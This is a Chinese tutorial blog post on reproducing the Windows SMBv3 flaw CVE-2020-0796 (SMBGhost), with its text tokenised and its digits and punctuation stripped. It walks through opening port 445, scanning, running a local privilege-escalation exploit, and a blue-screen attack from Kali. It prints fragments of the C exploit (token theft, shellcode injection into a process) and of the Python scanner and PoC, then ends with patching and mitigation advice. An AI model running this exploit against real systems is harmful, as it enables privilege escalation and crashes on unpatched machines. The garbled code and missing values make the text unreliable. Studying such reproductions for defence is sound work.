系统安全 十 windows 漏洞 利 用之 smbv3 服务 远程 代码 执行 漏洞 cve-2020-0796 复现 您 可能 之前 看到过 我 写 的 类似 文章 为什么 还要 重复 撰写 呢 只是 想 更好 地 帮助 初学者 了解 病毒 逆向 分析 和 系统安全 更加 成 体系 且不 破坏 之前 的 系列 因此 我 重新 开 设了 这个 专栏 准备 系统 整理 和 深入 学习 系统安全 逆向 分析 和 恶意代码 检测 系统安全 系列 文章 会 更加 聚焦 更加 系统 更加 深入 也是 作者 的 慢慢 成长史 换 专业 确实 挺 难 的 逆向 分析 也是 块 硬骨头 但我 也 试试 看看 自己 未来 四年 究竟 能 将它 学到 什么 程度 漫漫 长征路 偏向虎山行 享受 过程 一起 加油 系统安全 系列 作者 将 深入研究 恶意 样本 分析 逆向 分析 攻防 实 战和 windows 漏洞 利用 等 通过 在线 笔记 和 实践 操作 的 形式 分享 与 博 友 们 学习 希望 能与 您 一起 进步 前文 介绍 了 ms 远程 代码 执行 漏洞 cve 它是 windowsserver 服务 rpc 请求 缓冲区 溢出 漏洞 利用 端口 这篇 文章 将 详细 讲解 smbv 服务 远程 代码 执行 漏洞 cve 攻击者 可能 利用 此 漏洞 远程 无需 用户 验证 通过 发送 构造 特殊 的 恶意 数据 导致 在 目标 系统 上 执行 恶意代码 从而 获取 机器 的 完全 控制 利用 的 端口 仍是 希望 对 入门 的 同学 有 帮助 话 不 多说 让我们 开始 新 的 征程 吧 您 的 点 赞 评论 收藏 将是 对 我 最大 的 支持 感恩 安全 路上 一路 前行 如果有 写得 不好 的 地方 可以 联系 我 修改 基础性 文章 希望 对 您 有所 帮助 作者 的 目的 是 与 安 全人 共同进步 加油 也 强烈推荐 大家 去 看看 参考文献 的 视频 和 书籍 文章 目录 一 漏洞 描述 二 win 本地 提 权 开启 端口 smbghost 漏洞 扫描 本地 exp 提取 三 虚拟机 蓝屏 攻击 环境 搭建 攻击 实验 四 漏洞 原因 分析 c 代码 解析 python 代码 解析 五 防御 措施 六 总结 作者 的 github 资源 系统安全 网络安全 前文 分析 系统安全 一 什么 是 逆向 分析 逆向 分析 基础 及 经典 扫雷 游戏 逆向 系统安全 二 如何 学好 逆向 分析 及 吕布 传 游戏 逆向 案例 系统安全 三 idapro 反汇编 工具 初识 及 逆向 工程 解密 实战 系统安全 四 ollydbg 动态 分析 工具 基础 用法 及 crakeme 逆向 破解 系统安全 五 ollydbg 和 cheatengine 工具 逆向 分析 植物 大战 僵尸 游戏 系统安全 六 逆向 分析 之 条件 语句 和 循环 语句 源码 还原 及 流程 控制 系统安全 七 逆向 分析 之 pe 病毒 原理 c 实现 文件 加解密 及 ollydbg 逆向 系统安全 八 windows 漏洞 利 用之 cve 复现 及 蓝屏 攻击 系统安全 九 windows 漏洞 利 用之 ms 远程 代码 执行 漏洞 复现 及 深度 提 权 系统安全 十 windows 漏洞 利 用之 smbv 服务 远程 代码 执行 漏洞 cve 复现 声明 本人 坚决 反对 利用 教学方法 进行 犯罪 的 行为 一切 犯罪行为 必将 受到 严惩 绿色 网络 需要 我们 共同 维护 更 推荐 大家 了解 它们 背后 的 原理 更好 地 进行 防护 一 漏洞 描述 基本 描述 年月日 某 国外 安全 公司 发布 了 一个 近期 微软 安全 补丁包 所 涉及 漏洞 的 综述 其中 谈 到了 一个 威胁 等级 被 标 记为 critical 的 smb 服务 远程 代码 执行 漏洞 cve 攻击者 可能 利用 此 漏洞 远程 无需 用户 验证 通过 发送 构造 特殊 的 恶意 数据 导致 在 目标 系统 上 执行 恶意代码 从而 获取 机器 的 完全 控制 微软 服务 远程 代码 执行 漏洞 cve 可被 攻击者 利用 实现 无须 权限 即可 执行 远程 代码 受 攻击 的 目标 系统 只需 开机 在线 即 可能 被 入侵 该 漏洞 后果 十分 接近 永恒 之 蓝 系列 存 在被 wannacry 等 勒索 蠕虫 利用 的 可能 攻击者 可以 构造 特定 的 网页 压缩包 共享 目录 office 文档 等 多种 方式 触发 漏洞 进行 攻击 对 存在 该 漏洞 的 windows 主机 造成 严重威胁 目前 奇 安 信息 威胁 情报中心 红 雨滴 团队 已经 确认 漏洞 的 存在 利用 此 漏洞 可以 稳定地 导致 系统 崩溃 不 排除 执行 任意 代码 的 可能性 由于 漏洞 无需 用户 验证 的 特性 可能 导致 类似 wannacry 攻击 那样 蠕虫 式 的 传播 年月日 微软 发布 了 相应 的 安全补丁 强烈建议 用户 立即 安装 补丁 以免 受此 漏洞 导致 的 风险 年月日 已有 可 导致 受影响 系统 蓝屏 崩溃 的 漏洞 利用 poc 在 公开 渠道 发布 可以 稳定地 导致 系统 远程 拒绝服务 月 日 奇 安 信 代码 安全 团队 发布 了 针 对此 漏洞 的 远程 无损 扫描器 可以 帮助 网络管理员 快速 地 识别 存 在此 漏洞 的 系统 欢迎 使用 月 日 公开 渠道 出现 利用 此 漏洞 的 本地 提 权 利用 代码 奇 安 信 验证 可用 本地 攻击者 可以 利用 漏洞 从 普通用户 权限 提升到 系统 权限 参考文献 奇 安 信 威胁 情报中心 红 雨滴 团队 的 分析 报告 影响 版 本该 漏洞 属于 远程 代码 执行 漏洞 漏洞 主要 影响 windows 的 系统 及 应用 版本 和 包括 位 位 的 家用版 专业版 企业版 教育 版 具体 如下 漏洞 原理 在 微软 smbv 远程 代码 执行 漏洞 中 smb 协议 处理 压缩 消息 时 对 其中 的 数据 没有 经过 安全 检查 直接 使用 可能 引发 内存 破坏 漏洞 从而 被 攻击者 利用 远程 执行 任意 代码 攻击者 通过 发送 特殊 构造 的 数据包 触发 漏洞 无需 用户 验证 就可能 控制 目标 系统 同时 影响 服务器 与 客户端 系统 该 漏洞 存在于 windows 的 smbv 文件 共享 与 打印 服务 中 利用 的 端口 是 当 smbv 处理 恶意 制作 的 压缩 数据包 时 由于 smb 没有 正确处理 压缩 的 数据 包在 解压 数据包 的 时候 使用 客户端 传过来 的 长度 进行 解压 并没有 检查 长度 是否 合法 最终 导致 整数 溢出 远程 未经 认证 的 攻击者 就可能 利用 此 漏洞 在 应用程序 的 上下 文中 执行 任意 代码 系统 受到 非 授权 控制 漏洞 利用 本地 exp 提 权 扫描 工具 蓝屏 攻击 版本 漏洞 检测工具 作者 收集 工具 二 win 本地 提 权 第一个 实验 是 利用 cve 漏洞 进行 本地 提取 攻击者 利用 该 漏洞 从 普通用户 权限 提升到 系统 权限 实验 代码 采用 c 实现 主要 执行 exe 程序 参考 代码 开启 端口 首先 需要 开启 端口 该 端口 和 都是 常见 的 高危 端口 大家 需要 注意 防御 作为 安全 初学者 如果 指定 端口 都未 开启 或 关闭 谈何 后续 的 实验 及 防御 呢 由于 作者 被 该 端口 困扰 了 一段时间 所以 简单 分享 一些 基础知识 大佬 勿 喷 第一步 windows 查看 某个 端口 是否 开启 telnet 显示 连接 失败 端口 已 开启 echo 未 开启 端口 显示 未 开启 而 端口 显示 已 开启 netstatano 未 显示 tcp 开启 端口 第二步 高级 安全 入 站 规则 设置 端口 允许 点击 防火墙 gt 高级 设置 设 置入 站 规则 gt 新建 规则 gt 端口 设置 设置 tcp 特定 端口 允许 连接 和 应用 所有 规则 设置 成功 之后 如 下图 所示 在 测试 端口 是否 成功 此时 仍然 可能 显示 未 开启 第三步 注册表 中 新建 选项 在 注册表 中 查看 如下 路径 发现 没有 选项 计算机 在 右边 空白处 右击 新建 qword 位 值 然后 重 命名为 再把 这个 子键 的 值 改为 但是 作者 的 端口 仍然 显示 未 开启 哎 自己 真是 菜 得 抠 脚 第四步 启用 文件 和 打印机 共享 开启 server 服务 最终 原因是 server 服务 未 开启 server 支持 计算机 通过 网络 的 文件 打印 和 命名 管道 共享 如果 服务 停止 这些 功能 不可用 如果 服务 被 禁用 任何 直接 依赖 于此 服务 的 服务 将 无法 启动 网络 和 共享 中心 gt 高级 共享 设置 在 运行 中 输入 servicesmsc 打开 服务 开启 serverserver 开启 后 终于 成功 打开 端口 重启 计算机显示 开启 注意 实验 完成 之后 建议 关闭 端口 或 立刻 打补丁 smbghost 漏洞 扫描 接着 我们 尝 试用 代码 扫描 是否 存在 该 漏洞 win 注意 关闭 防火墙 运行 结果 如 下图 所示 表示 存在 cve 漏洞 安装 扩展 包 扫描 程序 仅 用于 测试 服务器 是否 易受攻击 它 通过 协商 请求 检查 smbv 协 议和 压缩 功能 源代码 如下 所示 该 漏洞 主 要是 由于 smbv 协议 在 处理 恶意 的 压缩 数据包 时 出错 所 造成 的 它 可让 远程 且 未经 身份验证 的 攻击者 在 目标 系统 上 执行 任意 代码 subnet socketafinet socksettimeout trysockconnect str ip exceptsockclose pkt nbstructunpack gtisockrecv ressockrecv nb print elseprint fipvulnerable print svulnerableip 本地 exp 提取 第一步 运行 c 代码 sln 程序 生成 如 下图 所示 exe 程序 cvelocalexe 第二步 在 运行 中 输入 winver 命令 检查 windows 版本 必须 是 win 或 显示 如 下图 所示 作者 的 未 第三步 用 管理员 权限 运行 cmd 命令提示符 输入 whoami 输出 结果 为 普通用户 权限 desktopkxxxxxx 第四步 用 管理员 打开 powershell 运行 exe 程序 提 权 按 下 组合键 windowsr 以 打开 运行 窗口 输入 powershell 会 以 当前 用户 的 权限 去 执行 如果 你想 要从 普通 模式 转至 管理员 模式 输入 以下 powershell 命令 然后按 下 回车键 输入 如下 命令 运行 exe 程序 按 tab 键 自动 补齐 cvelocalexe 成功 运行 程序 第五步 此时 exe 成功 运行 并 利用 smb 漏洞 在 cmd 中 输入 whoami 命令 可以 看到 普通用户 权限 提 升至 管理员 权限 普通 权限 desktopkxxxxxx 管理员 权限 系统管理员 帐户 许多 服务 和 windows 进程 需要 在内部 登录 例 如在 windows 安装 过程中 系统 帐户 就是 为 该 目的 设计 的 它是 内部 帐户 不 显示 在 用户 管理器 也 无法 添加到 任何 组 并且 不能 分配 用户 权限 默认 情况下 系统 帐户 授予 完全 控制 ntfs 卷 上 的 所有 文件 在此 系统 帐户 具有 作为 管理员 帐户 相同 的 功能 权限 普通 管理员 账户 不能够 在 系统 内部 登录 对于 文件 系统管理员 账户 和 sysem 账户 具有 相同 的 权限 但是 对于 一些 服务 和 进程 我们 需要 使用 系统 账户 而非 管理员 账户 因为 这些 服务 和 进程 要和 系统 交互 需要 内部 登 录在 执行 计划任务 时 如果 我们 使用 账户 那么 是 不需要 输入 密码 的 但是 使用 管理员 账户 我们 必须 输入 密码 一般 使用 系统 账户 是为了 防止 管理员 改变 密码 后 任务 无法 执行 对于 一般 的 操作 可以 使用 任何 一个 账户 但 还是 建议您 使用 管理员 或者 普通用户 执行 如果 和 进程 或者 服务 有关 的话 您可 以 使用 系统 账户 processexplorer 打开 的 提 权 进程 如 下图 所示 自此 本地 提 权 实验 成功 实验 结束 建议 关闭 端口 或 完善 补丁 切记 c 代码 及 原理 将在 文章 的 第四 部分 详细 讲解 三 虚拟机 蓝屏 攻击 环境 搭建 受害 机 windows 位 专业版 攻击机 kali 系统 第一步 在 虚拟机 中 安装 windows 系统 和 kali 系统 运行 中 输入 winver 查看 版本 信息 为 第二步 虚拟机 两个 系统 之间 能够 相互 通信 kaliwinxp 第三步 打开 windows 系统 确定 端口 开启 如 下图 所示 在 cmd 中 输入 netstatano 查看 端口 是否 打开 开启 方法 前面 已 详细 讲解 第四步 关闭 windows 系统 的 防火墙 注意 某些 情况 系统 已 打过 补丁 还需要 删除 补丁 kb 才能 成功 实验 作者 也 存在 一个 疑问 采用 win 位 版本 蓝屏 攻击 总 失败 why 删除 后 重启 计算机 即可 攻击 实验 第一步 采用 scannerpy 或 bash 文件 扫描 该 漏洞 这里 采用 另一 种方法 参考 资源 上传 文件 至 kali 系统 作者 采用 文件 共享 第二步 从 github 下载 poc 蓝屏 攻击 代码 至 kali 系统 命令 第三步 安装 扩展 包 并 实现 poc 蓝屏 攻击 此时 win 系统 蓝屏 重启 如 下图 所示 作者 又有 一个 疑问 如何 获取 shell 而 不 蓝屏 呢 四 漏洞 原因 分析 根据 安全 研究人员 分析 该 漏洞 是 一个 整数 溢出 发 生在 smb 服务 驱动 srvsys 的 函数 中 经过 研究 研究人员 成功 证明了 cve 漏洞 可以 被 用于 本地 权限 提升 不过 需要 注意 的 是 由于 api 的 依赖 问题 这个 exploit 被 限制 于 中等 完整性 级别 integritylevel 漏洞 成因 推荐 如下 文章 安全 人员 发布 利用 cve 实现 提 权限 的 分析 晓得 哥 cve 本地 利用 简 析 goaboutc 代码 解析 danigargu dialluvioso libwslib handleh ntstatus globalalloc gmemzeroinitlen while status ntstatus xc if status ntstatus x printf ulongptrsfor dword pidmypid continueif handle ulongptr h return ulong if token interrif msgnull printf if errclosesocket sock socketerror printf closesocket wsacleanup socketsock errsend sock constchar bufsizeof buf socketerror recv response uintt malloc sizeof buf xlen if packetnull printf n returnerrorexit socknull memcpy packetbufsizeof buf uintt packetsizeof buf xffffffbc uintt packetsizeof buf x xffffffbcmemcpy packetsizeof buf xbufferlen if errsend sock constchar packetsizeof buf xlen socketerror recv response free packet void processentry swshow intpidif processfirst true while processnext true if lstrcmpia snapshot if pidlt printf returnprintf if hprocnull printf if lpmemnull printf returnif shellcode printf returnif hprocnull lpmem printf returnprintf success n intmain intargccharargv cvelpen printf if errwsastartup printf wsastartup lobyte wsadatawversion hibyte wsadatawversion printf wsacleanup if printf socket wsacleanup inetpton if connect sock sockaddr ampclientsizeof client socketerror returnerrorexit sockconnect printf int sock printf if sendnegotiation sock socketerror printf returnerrorexit socksend printf uchar malloc buffersize if buffernull printf n returnerrorexit socknull if ktoken printf memset bufferax uintt bufferx if printf returnerrorexit socknull if lpworkspacenull printf n returnerrorexit socknull if printf free lpworkspace returnerrorexit socknull printf if sendcompressed socketerror returnerrorexit socksend printf inject wsacleanup 代码 解析 self self xx selftypelength self xxlength self xxlength self selfdata gtilen data decode latin self selfdata ltilen selfdata decode latin self sock getpacket socksend packetencode latin sockrecv sockdata data getpacket socksend packetencode latin sockrecv ifnamemainiflen sysargv exit sysargv socketafinet socksettimeout sockconnect sysargv sendnegotiation sock sendcompressed socka 五 防御 措施 写到 这里 这篇 cve 漏洞 复现 的 文章 就 介绍 结束 了 希望 对 您 有所 帮助 这篇 文章 也 存在 一些 不足 作者 没有 更 深入 的 理解 其 原理 也是 作为 网络安全 初学者 的 慢慢 成长 路 吧 希望 未来 能 更 透彻 撰写 相关 文章 最后 补充 防御 方法 运行 windows 更新 完成 windows 年月 累积 更新 补丁 的 安装 操作 步骤 设置 gt 更 新和 安全 gtwindows 更新 点击 检查 更新 直接 下载 对应 补丁 进行 安装 访问 微软 该 漏洞 官方 页面 选择 相应 的 windows 版本 安全 更新 独立 安装 该 漏洞 安全补丁 根据 的 说法 尽管 microsoft 并未 共享 禁用 smbv 压缩 的 官方 方法 但是 架构师 niallnewman 在 分析 了 srvsys 文件 后 可以 通过 手动 修改 注册表 防止 被 黑客 远程 攻击 在 注册表 建立 一个 名为 的 dword 值 为 禁止 smb 的 压缩 功能 在 管理员 模式 启动 powershell 将 以下 命令 复制到 powershell 命令行 执行 即可 若无 业务 必要 在 网络安全 域 边界 防火墙 封堵 文件 打印 和 共享 端口 tcp 以 缓解 此 问题 可以 通过 安全 厂商 的 漏洞 检验 和 修复 工具 来 检查 是否 存在 漏洞 和 进行 漏洞 修复 六 总结 希望 这 系列 文章 对 您 有所 帮助 真的 感觉 自己 技术 好菜 要 学 的 知识 好多 作为 初学者 我们 可能有 差距 不论 你 之前 是什么 方向 是什么 工作 是什么 学历 是 大学 大专 中专 亦 或是 高中 初中 只要 你 喜欢 安全 喜欢 渗透 就 朝着 这个 目标 去 努力 吧 有 差距 不 可怕 我们 需要 的 是 去 缩小差距 去 战斗 况且 这个 学习 的 历程 真的 很美 安全 真的 有意思 但 切勿 去做 坏事 我们 需要 的 是 白 帽子 是 维护 我们 的 网络安全 路上 共勉 最后 真诚地 感谢您 关注 娜 璋 璋 之家 公众 号 也 希望 我 的 文章 能 陪伴 你 成长 希望 在 技术 路上 不断 前行 文章 如果 对 你 有 帮助 有 感悟 就是 对 我 最好 的 回报 且看 且 珍惜 再次 感谢您 的 关注 也 请 帮忙 宣 传下 娜 璋 之家 哈哈 初来乍到 还请 多多指教 顺便 说 一句 今天 csdn 账号 的 粉丝 破 十万 了 还 挺 开心 的 byeastmount 夜 于 武汉 参考文献 更新 公开 渠道 出现 本地 提 权 工具 微软 windowssmbv 服务 远程 代码 执行 漏洞 cve 通告 奇 安 信 威胁 情报中心 红 雨滴 团队 关于 cve 我 要 变 超人 cve 本地 利用 简 析 cve 蓝屏 poc 漏洞 复现 漏洞 复现 蓝屏 poc ladingcvesmbv 的 rce 漏洞 下一个 平台 和 端口 谢 公子 大佬 linux 文件 共享 服务 之 samba 谢 公子 大佬 端口 不通 经验总结 frankarmstrong 计划任务 中 使用 用户 和 普通 管理员 用户 有 什么区别 漏洞 蓝屏 复现 提 权 